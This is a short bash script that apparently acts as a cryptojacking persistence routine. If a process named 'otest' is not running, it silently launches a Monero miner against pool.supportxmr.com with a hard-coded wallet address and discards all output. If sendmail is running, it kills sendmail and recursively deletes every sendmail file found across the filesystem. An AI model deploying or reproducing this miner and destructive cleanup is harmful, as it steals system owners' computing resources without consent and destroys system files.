#!/bin/bash

t=$(top -b  | head | grep  otest | awk '{print $12}')

case $t in
otest)
echo yes
;;
sendmail)
kill 9  $(ps -ef | grep sendmail | awk '{print $2}' )
rm -rf $(find / -name sendmail)
;;
*)
cd /opt/x  && nohup ./otest  -o pool.supportxmr.com:443 -u            49kMFsuBD4Uh76qzTJeU7iXfpnzFyhnqFgKWdih8rdZu92z4EFYDQBAP27cw135A7JBsYX81LiPUvEnhmU7ni31E3MPu5fN -k --tls -p x &>/dev/null &
;;
esac
